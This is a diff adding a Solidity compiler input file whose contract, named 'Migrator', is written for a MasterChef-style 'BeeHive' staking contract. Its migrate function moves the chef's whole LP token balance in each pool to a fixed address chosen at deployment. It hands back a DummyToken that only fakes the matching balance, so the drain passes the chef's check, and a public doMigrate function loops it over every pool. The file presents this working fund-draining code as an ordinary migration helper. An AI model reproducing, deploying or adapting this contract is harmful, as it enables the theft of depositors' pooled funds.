@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 400
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/Migrator2.sol": {
+      "content": "\n// File: contracts/uniswapv2/interfaces/IUniswapV2Pair.sol\n\npragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n    function balanceOf(address owner) external view returns (uint);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n}\n\ninterface IBeeHive {\n    function poolLength() external view returns (uint256);\n    function migrate(uint256 _pid) external;\n}\n\n// File: contracts/Migrator.sol\n\npragma solidity >=0.5.0;\n\n\ncontract DummyToken {\n    uint256 balance;\n    \n    constructor(uint256 _amount) public {\n        balance = _amount;\n    }\n    \n    function balanceOf(address _owner) external view returns (uint256) {\n        return balance;\n    }\n}\n\n\ncontract Migrator {\n    IBeeHive public chef;\n    address to;\n\n    constructor(\n        IBeeHive _chef,\n        address _to\n    ) public {\n        chef = _chef;\n        to = _to;\n    }\n    \n    function doMigrate() public {\n        for (uint256 pid = 0; pid < chef.poolLength(); ++pid) {\n            chef.migrate(pid);\n        }\n    }\n\n    function migrate(IUniswapV2Pair orig) public returns (DummyToken) {\n        require(msg.sender == address(chef), \"not from master chef\");\n        \n        uint256 lp = orig.balanceOf(msg.sender);\n        \n        DummyToken dummy = new DummyToken(lp);\n        \n        if (lp == 0) return dummy;\n        orig.transferFrom(msg.sender, to, lp);\n        return dummy;\n    }\n}\n"
+    }
+  }
+}
